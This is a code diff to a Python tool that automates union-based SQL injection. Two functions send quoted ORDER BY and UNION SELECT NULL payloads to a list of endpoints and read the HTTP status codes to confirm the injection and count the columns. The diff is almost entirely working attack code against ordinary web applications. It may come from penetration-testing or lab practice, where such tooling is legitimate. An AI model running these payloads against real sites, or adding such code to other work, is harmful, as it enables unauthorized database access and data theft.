@@ -9,17 +9,14 @@ log.set_config()
 def try_order_by_sqli(url, options: list):
     vuln_endpoints = options[0]
     db_comment = options[1]
-    index = 1
     for endp in vuln_endpoints:
-        for i in range(0, 25):
+        for index in range(1, 25):
             pld = "' ORDER BY " + str(index) + db_comment
             pld = requests.utils.quote(pld)
             r = requests.get(url=url + endp + pld)
             log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                             f"on endpoint {url + endp + pld}")
-            if r.status_code == 200:
-                index += 1
-            else:
+            if r.status_code == 500:
                 log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                 f"on endpoint {url + endp + pld}")
                 log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
@@ -33,28 +30,22 @@ def generate_null_pld(db_comment, index):
     if index == 1:
         return base_pld + db_comment
     # Otherwise we add NULLs
-    else:
-        for i in range(0, index):
-            base_pld += ", NULL"
-        base_pld += db_comment
+    nulls = ", NULL" * (index - 1)
+    base_pld += nulls + db_comment
     return base_pld
-
 
 
 def try_null_sqli(url, options: list):
     vuln_endpoints = options[0]
     db_comment = options[1]
-    index = 1
     for endp in vuln_endpoints:
-        for i in range(0, 25):
+        for index in range(0, 25):
             pld = generate_null_pld(db_comment, index)
             pld = requests.utils.quote(pld)
             r = requests.get(url=url + endp + pld)
             log.logger.info(f"{BLUE}[*]{RESET} Trying union SQLi "
                             f"on endpoint {url + endp + pld}")
-            if r.status_code == 500:
-                index += 1
-            else:
+            if r.status_code == 200:
                 log.logger.info(f"{GREEN}[+]{RESET} Confirmed union SQLi "
                                 f"on endpoint {url + endp + pld}")
                 log.logger.info(f"{BLUE}[*]{RESET} Number of columns "
